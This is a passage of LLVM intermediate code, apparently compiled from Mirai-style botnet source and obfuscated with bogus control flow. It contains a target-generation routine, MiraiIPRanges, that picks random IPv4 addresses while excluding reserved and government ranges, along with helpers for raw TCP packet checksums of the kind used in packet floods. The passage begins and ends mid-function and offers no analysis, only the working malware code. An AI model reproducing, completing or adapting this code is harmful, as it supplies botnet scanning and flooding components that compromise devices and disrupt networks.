  %100 = load i32, i32* @y.58
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %98
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 172
  %110 = load i32, i32* @x.57
  %111 = load i32, i32* @y.58
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %109, label %118, label %126

; <label>:118:                                    ; preds = %originalBBpart236
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp sge i32 %120, 16
  br i1 %121, label %122, label %126

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp slt i32 %124, 32
  br i1 %125, label %312, label %126

; <label>:126:                                    ; preds = %122, %118, %originalBBpart236
  %127 = load i32, i32* @x.57
  %128 = load i32, i32* @y.58
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %126
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 100
  %138 = load i32, i32* @x.57
  %139 = load i32, i32* @y.58
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %137, label %146, label %170

; <label>:146:                                    ; preds = %originalBBpart240
  %147 = load i32, i32* @x.57
  %148 = load i32, i32* @y.58
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %146
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp sge i32 %156, 64
  %158 = load i32, i32* @x.57
  %159 = load i32, i32* @y.58
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %157, label %166, label %170

; <label>:166:                                    ; preds = %originalBBpart244
  %167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %168 = zext i8 %167 to i32
  %169 = icmp slt i32 %168, 127
  br i1 %169, label %312, label %170

; <label>:170:                                    ; preds = %166, %originalBBpart244, %originalBBpart240
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 169
  br i1 %173, label %174, label %194

; <label>:174:                                    ; preds = %170
  %175 = load i32, i32* @x.57
  %176 = load i32, i32* @y.58
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %174
  %183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp sgt i32 %184, 254
  %186 = load i32, i32* @x.57
  %187 = load i32, i32* @y.58
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %185, label %312, label %194

; <label>:194:                                    ; preds = %originalBBpart248, %170
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 198
  br i1 %197, label %198, label %222

; <label>:198:                                    ; preds = %194
  %199 = load i32, i32* @x.57
  %200 = load i32, i32* @y.58
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %198
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp sge i32 %208, 18
  %210 = load i32, i32* @x.57
  %211 = load i32, i32* @y.58
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %209, label %218, label %222

; <label>:218:                                    ; preds = %originalBBpart252
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp slt i32 %220, 20
  br i1 %221, label %312, label %222

; <label>:222:                                    ; preds = %218, %originalBBpart252, %194
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 224
  br i1 %225, label %312, label %226

; <label>:226:                                    ; preds = %222
  %227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 6
  br i1 %229, label %310, label %230

; <label>:230:                                    ; preds = %226
  %231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 7
  br i1 %233, label %310, label %234

; <label>:234:                                    ; preds = %230
  %235 = load i32, i32* @x.57
  %236 = load i32, i32* @y.58
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %234
  %243 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %244 = zext i8 %243 to i32
  %245 = icmp eq i32 %244, 11
  %246 = load i32, i32* @x.57
  %247 = load i32, i32* @y.58
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %245, label %310, label %254

; <label>:254:                                    ; preds = %originalBBpart256
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 21
  br i1 %257, label %310, label %258

; <label>:258:                                    ; preds = %254
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 22
  br i1 %261, label %310, label %262

; <label>:262:                                    ; preds = %258
  %263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 26
  br i1 %265, label %310, label %266

; <label>:266:                                    ; preds = %262
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 28
  br i1 %269, label %310, label %270

; <label>:270:                                    ; preds = %266
  %271 = load i32, i32* @x.57
  %272 = load i32, i32* @y.58
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %270
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 29
  %282 = load i32, i32* @x.57
  %283 = load i32, i32* @y.58
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %281, label %310, label %290

; <label>:290:                                    ; preds = %originalBBpart260
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 30
  br i1 %293, label %310, label %294

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 33
  br i1 %297, label %310, label %298

; <label>:298:                                    ; preds = %294
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 55
  br i1 %301, label %310, label %302

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 214
  br i1 %305, label %310, label %306

; <label>:306:                                    ; preds = %302
  %307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 215
  br label %310

; <label>:310:                                    ; preds = %306, %302, %298, %294, %290, %originalBBpart260, %266, %262, %258, %254, %originalBBpart256, %230, %226
  %311 = phi i1 [ true, %302 ], [ true, %298 ], [ true, %294 ], [ true, %290 ], [ true, %originalBBpart260 ], [ true, %266 ], [ true, %262 ], [ true, %258 ], [ true, %254 ], [ true, %originalBBpart256 ], [ true, %230 ], [ true, %226 ], [ %309, %306 ]
  br label %312

; <label>:312:                                    ; preds = %310, %222, %218, %originalBBpart248, %166, %122, %94, %86, %82, %originalBBpart232, %58, %originalBBpart228, %34, %30
  %313 = phi i1 [ true, %222 ], [ true, %218 ], [ true, %originalBBpart248 ], [ true, %166 ], [ true, %122 ], [ true, %94 ], [ true, %86 ], [ true, %82 ], [ true, %originalBBpart232 ], [ true, %58 ], [ true, %originalBBpart228 ], [ true, %34 ], [ true, %30 ], [ %311, %310 ]
  %314 = load i32, i32* @x.57
  %315 = load i32, i32* @y.58
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %312
  %322 = load i32, i32* @x.57
  %323 = load i32, i32* @y.58
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %313, label %330, label %343

; <label>:330:                                    ; preds = %originalBBpart264
  %331 = call i32 @rand() #5
  %332 = srem i32 %331, 223
  %333 = trunc i32 %332 to i8
  store i8 %333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %334 = call i32 @rand() #5
  %335 = srem i32 %334, 255
  %336 = trunc i32 %335 to i8
  store i8 %336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %337 = call i32 @rand() #5
  %338 = srem i32 %337, 255
  %339 = trunc i32 %338 to i8
  store i8 %339, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %340 = call i32 @rand() #5
  %341 = srem i32 %340, 255
  %342 = trunc i32 %341 to i8
  store i8 %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %30

; <label>:343:                                    ; preds = %originalBBpart264
  %344 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %344, i8 0, i64 16, i32 16, i1 false)
  %345 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %346 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %347 = zext i8 %346 to i32
  %348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %349 = zext i8 %348 to i32
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %351 = zext i8 %350 to i32
  %352 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  %353 = zext i8 %352 to i32
  %354 = call i32 (i8*, i8*, ...) @szprintf(i8* %345, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.473, i32 0, i32 0), i32 %347, i32 %349, i32 %351, i32 %353)
  %355 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %356 = call i32 @inet_addr(i8* %355) #5
  ret i32 %356

originalBBalteredBB:                              ; preds = %originalBB, %0
  %357 = alloca [16 x i8], align 16
  %358 = call i32 @rand() #5
  %_ = sub i32 %358, 223
  %gen = mul i32 %_, 223
  %_1 = shl i32 %358, 223
  %_2 = shl i32 %358, 223
  %_3 = shl i32 %358, 223
  %_4 = sub i32 %358, 223
  %gen5 = mul i32 %_4, 223
  %359 = srem i32 %358, 223
  %360 = trunc i32 %359 to i8
  store i8 %360, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %361 = call i32 @rand() #5
  %_6 = sub i32 %361, 255
  %gen7 = mul i32 %_6, 255
  %_8 = shl i32 %361, 255
  %_9 = shl i32 %361, 255
  %362 = srem i32 %361, 255
  %363 = trunc i32 %362 to i8
  store i8 %363, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %364 = call i32 @rand() #5
  %_10 = shl i32 %364, 255
  %_11 = sub i32 %364, 255
  %gen12 = mul i32 %_11, 255
  %_13 = sub i32 0, %364
  %gen14 = add i32 %_13, 255
  %_15 = sub i32 %364, 255
  %gen16 = mul i32 %_15, 255
  %_17 = shl i32 %364, 255
  %_18 = sub i32 0, %364
  %gen19 = add i32 %_18, 255
  %_20 = shl i32 %364, 255
  %365 = srem i32 %364, 255
  %366 = trunc i32 %365 to i8
  store i8 %366, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %367 = call i32 @rand() #5
  %_21 = sub i32 0, %367
  %gen22 = add i32 %_21, 255
  %_23 = shl i32 %367, 255
  %_24 = sub i32 %367, 255
  %gen25 = mul i32 %_24, 255
  %368 = srem i32 %367, 255
  %369 = trunc i32 %368 to i8
  store i8 %369, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %originalBB

originalBB26alteredBB:                            ; preds = %originalBB26, %38
  %370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 3
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %62
  %373 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 16
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %98
  %376 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %377 = zext i8 %376 to i32
  %378 = icmp eq i32 %377, 172
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %126
  %379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %380 = zext i8 %379 to i32
  %381 = icmp eq i32 %380, 100
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %146
  %382 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %383 = zext i8 %382 to i32
  %384 = icmp sge i32 %383, 64
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %174
  %385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp sgt i32 %386, 254
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %198
  %388 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %389 = zext i8 %388 to i32
  %390 = icmp sge i32 %389, 18
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %234
  %391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 11
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %270
  %394 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %395 = zext i8 %394 to i32
  %396 = icmp eq i32 %395, 29
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %312
  br label %originalBB62
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = load i32, i32* @x.61
  %4 = load i32, i32* @y.62
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.61
  %15 = load i32, i32* @y.62
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart217, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp sgt i32 %23, 1
  br i1 %24, label %25, label %50

; <label>:25:                                     ; preds = %22
  %26 = load i32, i32* @x.61
  %27 = load i32, i32* @y.62
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load i16*, i16** %11, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %11, align 8
  %36 = load i16, i16* %34, align 2
  %37 = zext i16 %36 to i64
  %38 = load i64, i64* %13, align 8
  %39 = add i64 %38, %37
  store i64 %39, i64* %13, align 8
  %40 = load i32, i32* %12, align 4
  %41 = sub nsw i32 %40, 2
  store i32 %41, i32* %12, align 4
  %42 = load i32, i32* @x.61
  %43 = load i32, i32* @y.62
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart217, label %originalBB1alteredBB

originalBBpart217:                                ; preds = %originalBB1
  br label %22

; <label>:50:                                     ; preds = %22
  %51 = load i32, i32* %12, align 4
  %52 = icmp sgt i32 %51, 0
  br i1 %52, label %53, label %60

; <label>:53:                                     ; preds = %50
  %54 = load i16*, i16** %11, align 8
  %55 = bitcast i16* %54 to i8*
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i64
  %58 = load i64, i64* %13, align 8
  %59 = add i64 %58, %57
  store i64 %59, i64* %13, align 8
  br label %60

; <label>:60:                                     ; preds = %53, %50
  %61 = load i32, i32* @x.61
  %62 = load i32, i32* @y.62
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %60
  %69 = load i32, i32* @x.61
  %70 = load i32, i32* @y.62
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %77

; <label>:77:                                     ; preds = %81, %originalBBpart221
  %78 = load i64, i64* %13, align 8
  %79 = lshr i64 %78, 16
  %80 = icmp ne i64 %79, 0
  br i1 %80, label %81, label %87

; <label>:81:                                     ; preds = %77
  %82 = load i64, i64* %13, align 8
  %83 = and i64 %82, 65535
  %84 = load i64, i64* %13, align 8
  %85 = lshr i64 %84, 16
  %86 = add i64 %83, %85
  store i64 %86, i64* %13, align 8
  br label %77

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* @x.61
  %89 = load i32, i32* @y.62
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %87
  %96 = load i64, i64* %13, align 8
  %97 = xor i64 %96, -1
  %98 = trunc i64 %97 to i16
  %99 = load i32, i32* @x.61
  %100 = load i32, i32* @y.62
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart229, label %originalBB23alteredBB

originalBBpart229:                                ; preds = %originalBB23
  ret i16 %98

originalBBalteredBB:                              ; preds = %originalBB, %2
  %107 = alloca i16*, align 8
  %108 = alloca i32, align 4
  %109 = alloca i64, align 8
  store i16* %0, i16** %107, align 8
  store i32 %1, i32* %108, align 4
  store i64 0, i64* %109, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %110 = load i16*, i16** %11, align 8
  %111 = getelementptr inbounds i16, i16* %110, i32 1
  store i16* %111, i16** %11, align 8
  %112 = load i16, i16* %110, align 2
  %113 = zext i16 %112 to i64
  %114 = load i64, i64* %13, align 8
  %_ = sub i64 0, %114
  %gen = add i64 %_, %113
  %_2 = shl i64 %114, %113
  %_3 = sub i64 %114, %113
  %gen4 = mul i64 %_3, %113
  %_5 = sub i64 0, %114
  %gen6 = add i64 %_5, %113
  %_7 = sub i64 0, %114
  %gen8 = add i64 %_7, %113
  %_9 = sub i64 0, %114
  %gen10 = add i64 %_9, %113
  %115 = add i64 %114, %113
  store i64 %115, i64* %13, align 8
  %116 = load i32, i32* %12, align 4
  %_11 = sub i32 %116, 2
  %gen12 = mul i32 %_11, 2
  %_13 = sub i32 %116, 2
  %gen14 = mul i32 %_13, 2
  %_15 = shl i32 %116, 2
  %117 = sub nsw i32 %116, 2
  store i32 %117, i32* %12, align 4
  br label %originalBB1

originalBB19alteredBB:                            ; preds = %originalBB19, %60
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %87
  %118 = load i64, i64* %13, align 8
  %_24 = sub i64 %118, -1
  %gen25 = mul i64 %_24, -1
  %_26 = sub i64 0, %118
  %gen27 = add i64 %_26, -1
  %119 = xor i64 %118, -1
  %120 = trunc i64 %119 to i16
  br label %originalBB23
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
